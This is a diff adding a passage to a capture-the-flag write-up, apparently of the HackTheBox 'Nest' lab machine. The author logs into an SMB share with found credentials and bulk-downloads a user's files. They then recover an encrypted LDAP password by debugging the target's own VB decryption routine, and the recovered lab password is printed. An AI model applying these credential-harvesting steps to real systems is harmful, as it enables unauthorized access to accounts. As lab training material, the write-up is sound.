@@ -361,5 +361,188 @@ User: Carl
 RU Scanner
 RU_Config.xml
 <ConfigFile><Port>389</Port><Username>c.smith</Username><Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password></ConfigFile>
-We have c.smith's password
+We have c.smith's password in base64
+
+running cyberchef we find this: }13.ö.£=XÎJ¡BAú..X*.Wc.fí¸Î?Î²c.
+
+so its encrypted :(
+
+we know that there is a folder in secure$\Carl and a temp file lets try to get that. 
+
+### SMB Client
+
+```console
+noob2uub@kali:~/ctf/htb/nest/IT$ smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
+Try "help" to get a list of possible commands.
+smb: \> cd IT\Carl
+smb: \IT\Carl\> recurse on
+smb: \IT\Carl\> prompt off
+smb: \IT\Carl\> mget *
+getting file \IT\Carl\Docs\ip.txt of size 56 as Docs/ip.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+getting file \IT\Carl\Docs\mmc.txt of size 73 as Docs/mmc.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner.sln of size 871 as VB Projects/WIP/RU/RUScanner.sln (3.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\ConfigFile.vb of size 772 as VB Projects/WIP/RU/RUScanner/ConfigFile.vb (2.8 KiloBytes/sec) (average 1.6 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Module1.vb of size 279 as VB Projects/WIP/RU/RUScanner/Module1.vb (1.0 KiloBytes/sec) (average 1.5 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj of size 4828 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj (17.5 KiloBytes/sec) (average 4.2 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj.user of size 143 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user (0.5 KiloBytes/sec) (average 3.6 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\SsoIntegration.vb of size 133 as VB Projects/WIP/RU/RUScanner/SsoIntegration.vb (0.5 KiloBytes/sec) (average 3.2 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Utils.vb of size 4888 as VB Projects/WIP/RU/RUScanner/Utils.vb (17.8 KiloBytes/sec) (average 4.9 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.Designer.vb of size 441 as VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb (1.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.myapp of size 481 as VB Projects/WIP/RU/RUScanner/My Project/Application.myapp (1.7 KiloBytes/sec) (average 4.3 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\AssemblyInfo.vb of size 1163 as VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb (4.2 KiloBytes/sec) (average 4.3 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.Designer.vb of size 2776 as VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb (10.1 KiloBytes/sec) (average 4.7 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.resx of size 5612 as VB Projects/WIP/RU/RUScanner/My Project/Resources.resx (20.4 KiloBytes/sec) (average 5.8 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.Designer.vb of size 2989 as VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb (10.9 KiloBytes/sec) (average 6.2 KiloBytes/sec)
+getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.settings of size 279 as VB Projects/WIP/RU/RUScanner/My Project/Settings.settings (1.0 KiloBytes/sec) (average 5.8 KiloBytes/sec)
+smb: \IT\Carl\> 
+```
+# CARL protect your stuff :)
+
+### mmc.txt
+
+```console
+-- HANDY MMC SNAP INS --
+
+compmgmt.msc
+services.msc
+dsa.msc
+gpmc.msc
+```
+So we see a few things hes running
+
+### IP.txt
+
+```console
+ipconfig /flushdns
+ipconfig /release
+ipconfig /renew
+``` 
+
+nothing here, lets start looking for other stuff. Here is the entire directory owned by Carl.
+
+```console
+smb: \IT\Carl\> ls
+  .                                   D        0  Wed Aug  7 12:42:14 2019
+  ..                                  D        0  Wed Aug  7 12:42:14 2019
+  Docs                                D        0  Wed Aug  7 12:44:00 2019
+  Reports                             D        0  Tue Aug  6 06:45:40 2019
+  VB Projects                         D        0  Tue Aug  6 07:41:55 2019
+
+\IT\Carl\Docs
+  .                                   D        0  Wed Aug  7 12:44:00 2019
+  ..                                  D        0  Wed Aug  7 12:44:00 2019
+  ip.txt                              A       56  Wed Aug  7 12:44:16 2019
+  mmc.txt                             A       73  Wed Aug  7 12:43:42 2019
+
+\IT\Carl\Reports
+  .                                   D        0  Tue Aug  6 06:45:40 2019
+  ..                                  D        0  Tue Aug  6 06:45:40 2019
+
+\IT\Carl\VB Projects
+  .                                   D        0  Tue Aug  6 07:41:55 2019
+  ..                                  D        0  Tue Aug  6 07:41:55 2019
+  Production                          D        0  Tue Aug  6 07:07:13 2019
+  WIP                                 D        0  Tue Aug  6 07:47:41 2019
+
+\IT\Carl\VB Projects\Production
+  .                                   D        0  Tue Aug  6 07:07:13 2019
+  ..                                  D        0  Tue Aug  6 07:07:13 2019
+
+\IT\Carl\VB Projects\WIP
+  .                                   D        0  Tue Aug  6 07:47:41 2019
+  ..                                  D        0  Tue Aug  6 07:47:41 2019
+  RU                                  D        0  Fri Aug  9 08:36:45 2019
+
+\IT\Carl\VB Projects\WIP\RU
+  .                                   D        0  Fri Aug  9 08:36:45 2019
+  ..                                  D        0  Fri Aug  9 08:36:45 2019
+  RUScanner                           D        0  Wed Aug  7 15:05:54 2019
+  RUScanner.sln                       A      871  Tue Aug  6 07:45:36 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner
+  .                                   D        0  Wed Aug  7 15:05:54 2019
+  ..                                  D        0  Wed Aug  7 15:05:54 2019
+  bin                                 D        0  Wed Aug  7 13:00:11 2019
+  ConfigFile.vb                       A      772  Wed Aug  7 15:05:09 2019
+  Module1.vb                          A      279  Wed Aug  7 15:05:44 2019
+  My Project                          D        0  Wed Aug  7 13:00:11 2019
+  obj                                 D        0  Wed Aug  7 13:00:11 2019
+  RU Scanner.vbproj                   A     4828  Fri Aug  9 08:37:51 2019
+  RU Scanner.vbproj.user              A      143  Tue Aug  6 05:55:27 2019
+  SsoIntegration.vb                   A      133  Wed Aug  7 15:05:58 2019
+  Utils.vb                            A     4888  Wed Aug  7 12:49:35 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner\bin
+  .                                   D        0  Wed Aug  7 13:00:11 2019
+  ..                                  D        0  Wed Aug  7 13:00:11 2019
+  Debug                               D        0  Wed Aug  7 12:59:13 2019
+  Release                             D        0  Tue Aug  6 05:55:26 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner\My Project
+  .                                   D        0  Wed Aug  7 13:00:11 2019
+  ..                                  D        0  Wed Aug  7 13:00:11 2019
+  Application.Designer.vb             A      441  Tue Aug  6 05:55:13 2019
+  Application.myapp                   A      481  Tue Aug  6 05:55:13 2019
+  AssemblyInfo.vb                     A     1163  Tue Aug  6 05:55:13 2019
+  Resources.Designer.vb               A     2776  Tue Aug  6 05:55:13 2019
+  Resources.resx                      A     5612  Tue Aug  6 05:55:13 2019
+  Settings.Designer.vb                A     2989  Tue Aug  6 05:55:13 2019
+  Settings.settings                   A      279  Tue Aug  6 05:55:13 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner\obj
+  .                                   D        0  Wed Aug  7 13:00:11 2019
+  ..                                  D        0  Wed Aug  7 13:00:11 2019
+  x86                                 D        0  Wed Aug  7 12:59:18 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Debug
+  .                                   D        0  Wed Aug  7 12:59:13 2019
+  ..                                  D        0  Wed Aug  7 12:59:13 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Release
+  .                                   D        0  Tue Aug  6 05:55:26 2019
+  ..                                  D        0  Tue Aug  6 05:55:26 2019
+
+\IT\Carl\VB Projects\WIP\RU\RUScanner\obj\x86
+  .                                   D        0  Wed Aug  7 12:59:18 2019
+  ..                                  D        0  Wed Aug  7 12:59:18 2019
+
+		5242623 blocks of size 4096. 1840043 blocks available
+smb: \IT\Carl\> get temp.txt
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Carl\temp.txt
+smb: \IT\Carl\> 
+```
+Runnings strings on the RU Scananner module1.vb brings this.
+
+Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
+   
+It looks like I am going to have to open this in VS. So lets migrate it over to my home file share to execute on my Windows Machine
+
+![Screenshot_2022-05-02_10-30-40](https://user-images.githubusercontent.com/68706090/166295552-736d659b-20c3-4169-8e67-f93d63e0c199.png)
+
+![VS](https://user-images.githubusercontent.com/68706090/166299065-1b0d8fb7-89e1-4fa8-8a27-6fd40f11cda6.JPG)
+
+I have everything loaded in VS now lets run it. ![debug](https://user-images.githubusercontent.com/68706090/166299095-54cfb008-7d95-4ab8-879c-7fc4aabf3c07.JPG)
+
+This error shows that the XML file needs to be in the bin/debug folder. So lets run the code now. 
+
+After running the code, nothing happend and there was no outputed file to be shown. So I decided to put a break in the running process where I thought the encrpytion was going and just step into each next call. 
+
+It found this part of the code that was running the decryption. 
+
+```console
+  Public Shared Function DecryptString(EncryptedString As String) As String
+        If String.IsNullOrEmpty(EncryptedString) Then
+            Return String.Empty
+        Else
+            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+        End If
+    End Function
+```
+
+![2022-05-02 10_57_01-RUScanner (Debugging) - Microsoft Visual Studio](https://user-images.githubusercontent.com/68706090/166299505-9d1ef644-17d2-43cd-8d71-a8c0ceb64da1.png)
+
+There we go we have the new password 
+
+"xRxRxPANCAK3SxRxRx"
+
 
